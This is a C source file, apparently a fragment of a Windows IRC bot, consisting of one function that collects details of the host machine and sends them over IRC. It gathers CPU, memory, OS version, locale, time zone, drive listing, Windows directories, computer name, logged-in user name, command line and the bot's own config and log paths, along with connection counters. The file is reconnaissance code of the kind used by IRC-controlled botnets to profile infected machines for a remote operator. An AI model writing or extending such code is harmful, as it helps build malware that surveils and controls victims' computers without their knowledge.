
void action_info()
{
  irc_reply("version  : 1.10\n");
  irc_reply("i'm      : %s [%s]\n", irc_local_host, irc_local_ip_str);
  irc_reply("server   : %s [%s]\n", irc_server_name, IP2STR(irc_server_ip));
  irc_reply("port     : %i\n",irc_server_port);
  irc_reply("nick     : %s\n",irc_user_nick);
  irc_reply("name     : %s\n",irc_user_name);
  irc_reply("host     : %s\n",irc_user_host);
  irc_reply("realname : %s\n",irc_user_realname);
  irc_reply("forward  : %s\n",irc_forward);
  do_pause();
  SYSTEM_INFO si;
  GetSystemInfo(&si);
  irc_reply("CPU      : #=%i type=%i level=%i revision=%04X\n",
    si.dwNumberOfProcessors,
    si.dwProcessorType,
    si.wProcessorLevel,
    si.wProcessorRevision);
  if (irc_error) return;
  MEMORYSTATUS ms;
  ms.dwLength = sizeof(ms);
  GlobalMemoryStatus(&ms);
  irc_reply("M.phys  : %6i total %6i free\n", ms.dwTotalPhys    >>20, ms.dwAvailPhys    >>20);
  irc_reply("M.page  : %6i total %6i free\n", ms.dwTotalPageFile>>20, ms.dwAvailPageFile>>20);
  irc_reply("M.virt  : %6i total %6i free\n", ms.dwTotalVirtual >>20, ms.dwAvailVirtual >>20);
  OSVERSIONINFO ov;
  ov.dwOSVersionInfoSize = sizeof(ov);
  GetVersionEx(&ov);
  irc_reply("OS       : platform=%i(%s) ver=%i.%i build=%i '%s'\n",
    ov.dwPlatformId,
    ov.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS?"Win9X":
   (ov.dwPlatformId==VER_PLATFORM_WIN32_NT     ?"WinNT":
   (ov.dwPlatformId==5                         ?"Win2000":"?")),
    ov.dwMajorVersion, ov.dwMinorVersion,
    ov.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS?(ov.dwBuildNumber&0xFFFF):ov.dwBuildNumber,
    ov.szCSDVersion);
  char x1[512], x2[512];
  GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SENGCOUNTRY,  x1, sizeof(x1));
  GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SENGLANGUAGE, x2, sizeof(x2));
  irc_reply("country  : %s\n",x1);
  irc_reply("language : %s\n",x2);
  TIME_ZONE_INFORMATION tz;
  if (GetTimeZoneInformation(&tz) != 0xFFFFFFFF)
    irc_reply("TZ       : %c%i:%02i\n",
      tz.Bias>0?'-':'+', abs(tz.Bias)/60,abs(tz.Bias)%60);
  irc_reply("startup T: %s\n",irc_time_startup);
  irc_reply("curr.   T: %s\n",irc_gettime());
  irc_reply("#connect+: %i\n",irc_count_goodconnect);
  irc_reply("#connect-: %i\n",irc_count_badconnect);
  irc_reply("#except  : %i\n",irc_count_exceptions);
  do_pause();
  char* root = "X:\\";
  for (root[0]='C'; root[0]<='Z'; root[0]++)
  {
    int dtype = GetDriveType(root);
    char *dtypestr = 0;
    switch (dtype)
    {
      case DRIVE_REMOVABLE: dtypestr = "removable"; break;
      case DRIVE_FIXED:     dtypestr = "fixed    "; break;
      case DRIVE_REMOTE:    dtypestr = "remote   "; break;
      case DRIVE_CDROM:     dtypestr = "cd-rom   "; break;
      case DRIVE_RAMDISK:   dtypestr = "ramdisk  "; break;
    }
    if (dtypestr)
    {
      int dtotal = -1, dfree = -1;
      DWORD d_spc, d_bps, d_nfc, d_nc;
      if (GetDiskFreeSpace(root, &d_spc, &d_bps, &d_nfc, &d_nc)!=0)
      {
        dtotal = d_spc * d_bps * d_nc  / 1000000;
        dfree  = d_spc * d_bps * d_nfc / 1000000;
      }
      irc_reply("%s      : type=%s %6i total %6i free\n",
        root, dtypestr, dtotal, dfree);
      if (irc_error) return;
    }
  }
  do_pause();
  GetWindowsDirectory(x1, sizeof(x1));
  GetSystemDirectory (x2, sizeof(x2));
  irc_reply("windir   : %s\n",x1);
  irc_reply("sysdir   : %s\n",x2);
  DWORD d;
  d = sizeof(x1); if (!GetComputerName(x1, &d)) d = 0; x1[d] = 0;
  d = sizeof(x2); if (!GetUserName    (x2, &d)) d = 0; x2[d] = 0;
  irc_reply("CompName : %s\n", x1);
  irc_reply("UserName : %s\n", x2);
  int i = GetSystemMetrics(SM_CLEANBOOT);
  irc_reply("boot     : %i (%s)\n", i,
    i==0?"normal":(i==1?"fail-safe":(i==2?"fail-safe + network":"?")));
  irc_reply("network  : %i\n", GetSystemMetrics(SM_NETWORK));
  irc_reply("secure   : %i\n", GetSystemMetrics(SM_SECURE));
  do_pause();
  irc_reply("cmdline  : %s\n", GetCommandLine());
  irc_reply("inifile  : %s\n", irc_inifile);
  irc_reply("tmpfile  : %s\n", irc_tmpfile);
  irc_reply("logfile  : %s\n", irc_logfile);

} // action_info

